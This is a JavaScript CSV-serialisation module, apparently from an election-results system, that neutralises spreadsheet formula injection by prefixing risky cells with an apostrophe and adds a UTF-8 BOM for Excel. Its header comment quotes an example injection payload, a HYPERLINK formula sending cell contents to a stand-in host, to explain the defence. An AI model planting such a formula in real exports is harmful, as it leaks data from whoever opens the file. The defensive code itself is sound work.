/**
 * CSV serialisation.
 *
 * Two things matter here beyond quoting.
 *
 * Formula injection: a spreadsheet treats a cell beginning with =, +, -, @ or
 * a leading tab/carriage return as a formula. A candidate registered as
 * `=HYPERLINK("https://evil.example/"&A1,"Results")` becomes live code the
 * moment a returning officer opens the export. Quoting alone does not prevent
 * this — Excel strips the quotes and evaluates what is inside. Such cells are
 * therefore prefixed with an apostrophe, which forces text interpretation and
 * is not itself displayed.
 *
 * Encoding: Excel on Windows reads a CSV as the system codepage unless the
 * file opens with a UTF-8 byte order mark, which mangles the accented
 * characters common in Ghanaian names. The BOM is prepended for that reason.
 */

// U+FEFF, written as an escape so it survives any editor that strips it.
const BOM = '\ufeff'

const FORMULA_TRIGGER = /^[=+\-@\t\r]/

export function csvCell(value) {
    if (value === null || value === undefined) return '""'

    let text = String(value)

    if (FORMULA_TRIGGER.test(text)) {
        text = `'${text}`
    }

    return `"${text.replace(/"/g, '""')}"`
}

export function csvRow(cells) {
    return cells.map(csvCell).join(',')
}

/**
 * @param {Array<Array<any>>} rows  first row is treated as the header
 * @returns {string} CSV text, BOM-prefixed, CRLF-terminated per RFC 4180
 */
export function toCsv(rows) {
    return BOM + rows.map(csvRow).join('\r\n') + '\r\n'
}
